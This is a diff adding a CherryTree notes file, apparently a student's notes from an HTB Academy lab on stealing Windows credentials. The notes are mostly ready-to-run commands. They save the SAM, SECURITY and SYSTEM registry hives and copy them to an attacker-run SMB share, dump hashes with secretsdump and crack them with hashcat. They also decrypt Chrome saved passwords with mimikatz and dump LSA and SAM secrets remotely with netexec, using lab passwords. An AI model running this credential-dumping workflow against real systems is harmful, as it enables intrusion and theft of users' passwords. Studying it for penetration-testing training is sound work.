@@ -1,0 +1,128 @@
+<?xml version="1.0" encoding="UTF-8"?>
+<cherrytree>
+  <node unique_id="83" master_id="0" name="HKLM Registries" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1767361921" ts_lastsave="1767361930">
+    <rich_text>&#13;&#13;</rich_text>
+    <rich_text justification="left"></rich_text>
+    <rich_text>
+&#13;&#13;&#13;</rich_text>
+    <rich_text family="monospace">cmd.exe</rich_text>
+    <rich_text justification="left" scale="h3" foreground="#a4b1cd"> with administrative privileges, we can use </rich_text>
+    <rich_text family="monospace">reg.exe</rich_text>
+    <rich_text justification="left" scale="h3" foreground="#a4b1cd"> to save copies of the registry hives.</rich_text>
+    <rich_text>&#13;&#13;&#13;To transer:
+
+start local smb server:&#13;</rich_text>
+    <rich_text family="monospace" foreground="#ffaf00">sudo</rich_text>
+    <rich_text family="monospace"> python3 /usr/share/doc/python3-impacket/examples/smbserver.py -smb2support CompData /home/ltnbob/Documents/</rich_text>
+    <rich_text>&#13;
+move from windows over:&#13;</rich_text>
+    <rich_text family="monospace">C:\&gt; move sam.save \\10.10.15.16\CompData</rich_text>
+    <rich_text>&#13;
+&#13;For secret dumping:
+&#13;</rich_text>
+    <rich_text family="monospace" foreground="#ffaf00">locate</rich_text>
+    <rich_text family="monospace"> secretsdump</rich_text>
+    <rich_text>&#13;</rich_text>
+    <rich_text family="monospace">python3 /usr/share/doc/python3-impacket/examples/secretsdump.py -sam sam.save -security security.save -system system.save LOCAL</rich_text>
+    <rich_text>&#13;&#13;pupulate file:&#13;</rich_text>
+    <rich_text family="monospace" foreground="#ffaf00">sudo</rich_text>
+    <rich_text family="monospace"> </rich_text>
+    <rich_text family="monospace" foreground="#ffaf00">vim</rich_text>
+    <rich_text family="monospace"> hashestocrack.txt
+</rich_text>
+    <rich_text>crack:&#13;</rich_text>
+    <rich_text family="monospace" foreground="#ffaf00">sudo</rich_text>
+    <rich_text family="monospace"> hashcat -m </rich_text>
+    <rich_text family="monospace" foreground="#ffaf00">1000</rich_text>
+    <rich_text family="monospace"> hashestocrack.txt /usr/share/wordlists/rockyou.txt</rich_text>
+    <rich_text>&#13;&#13;for cached hashes:&#13;</rich_text>
+    <rich_text family="monospace">hashcat -m </rich_text>
+    <rich_text family="monospace" foreground="#ffaf00">2100</rich_text>
+    <rich_text family="monospace"> </rich_text>
+    <rich_text family="monospace" foreground="#c5f467">'$DCC2$10240#administrator#23d97555681813db79b2ade4b4a6ff25'</rich_text>
+    <rich_text family="monospace"> /usr/share/wordlists/rockyou.txt</rich_text>
+    <rich_text>&#13;&#13;
+&#13;&#13;&#13;</rich_text>
+    <rich_text justification="left"></rich_text>
+    <rich_text>
+&#13;</rich_text>
+    <rich_text justification="left" scale="h3" foreground="#a4b1cd">DPAPI encrypted credentials can be decrypted manually with tools like Impacket's </rich_text>
+    <rich_text link="webs https://github.com/fortra/impacket/blob/master/examples/dpapi.py">dpapi</rich_text>
+    <rich_text justification="left" scale="h3" foreground="#a4b1cd">, </rich_text>
+    <rich_text link="webs https://github.com/gentilkiwi/mimikatz">mimikatz</rich_text>
+    <rich_text justification="left" scale="h3" foreground="#a4b1cd">, or remotely with </rich_text>
+    <rich_text link="webs https://github.com/login-securite/DonPAPI">DonPAPI</rich_text>
+    <rich_text justification="left" scale="h3" foreground="#a4b1cd">.</rich_text>
+    <rich_text>&#13;&#13;</rich_text>
+    <rich_text family="monospace">C:\Users\Public&gt; mimikatz.exe
+mimikatz # dpapi::chrome /in:"C:\Users\bob\AppData\Local\Google\Chrome\User Data\Default\Login Data" /unprotect
+&gt; Encrypted Key found in local state file
+&gt; Encrypted Key seems to be protected by DPAPI
+ * using CryptUnprotectData API
+&gt; AES Key is: efefdb353f36e6a9b7a7552cc421393daf867ac28d544e4f6f157e0a698e343c
+
+URL     : http://10.10.14.94/ ( http://10.10.14.94/login.html )
+Username: bob
+ * using BCrypt with AES-256-GCM
+Password: April2025!</rich_text>
+    <rich_text>&#13;&#13;&#13;&#13;
+</rich_text>
+    <rich_text scale="h4">Dumping LSA secrets remotely</rich_text>
+    <rich_text>&#13;</rich_text>
+    <rich_text family="monospace">netexec smb </rich_text>
+    <rich_text family="monospace" foreground="#ffaf00">10.129</rich_text>
+    <rich_text family="monospace">.42.198 --local-auth -u bob -p HTB_@cademy_stdnt</rich_text>
+    <rich_text family="monospace" foreground="#5cb2ff">!</rich_text>
+    <rich_text family="monospace"> --lsa</rich_text>
+    <rich_text>&#13;&#13;&#13;
+</rich_text>
+    <rich_text scale="h4">Dumping SAM Remotely</rich_text>
+    <rich_text>&#13;n</rich_text>
+    <rich_text family="monospace">etexec smb </rich_text>
+    <rich_text family="monospace" foreground="#ffaf00">10.129</rich_text>
+    <rich_text family="monospace">.42.198 --local-auth -u bob -p HTB_@cademy_stdnt</rich_text>
+    <rich_text family="monospace" foreground="#5cb2ff">!</rich_text>
+    <rich_text family="monospace"> --sam</rich_text>
+    <rich_text>&#13;&#13;&#13;</rich_text>
+    <table char_offset="2" justification="left" col_min="60" col_max="60" col_widths="0,0">
+      <row>
+        <cell>HKLM\SYSTEM</cell>
+        <cell>Stores the system boot key, which is used to encrypt the SAM database. This key is required to decrypt the hashes.</cell>
+      </row>
+      <row>
+        <cell>HKLM\SECURITY</cell>
+        <cell>Contains sensitive information used by the Local Security Authority (LSA), including cached domain credentials (DCC2), cleartext passwords, DPAPI keys, and more.</cell>
+      </row>
+      <row>
+        <cell>HKLM\SAM</cell>
+        <cell>Contains password hashes for local user accounts. These hashes can be extracted and cracked to reveal plaintext passwords.</cell>
+      </row>
+    </table>
+    <table char_offset="750" justification="left" col_min="500" col_max="500" col_widths="0,0">
+      <row>
+        <cell>Internet Explorer</cell>
+        <cell>Password form auto-completion data (username and password for saved sites).</cell>
+      </row>
+      <row>
+        <cell>Google Chrome</cell>
+        <cell>Password form auto-completion data (username and password for saved sites).</cell>
+      </row>
+      <row>
+        <cell>Outlook</cell>
+        <cell>Passwords for email accounts.</cell>
+      </row>
+      <row>
+        <cell>Remote Desktop Connection</cell>
+        <cell>Saved credentials for connections to remote machines.</cell>
+      </row>
+      <row>
+        <cell>Credential Manager</cell>
+        <cell>Saved credentials for accessing shared resources, joining Wireless networks, VPNs and more.</cell>
+      </row>
+      <row>
+        <cell>Applications</cell>
+        <cell>Use of DPAPI</cell>
+      </row>
+    </table>
+  </node>
+</cherrytree>
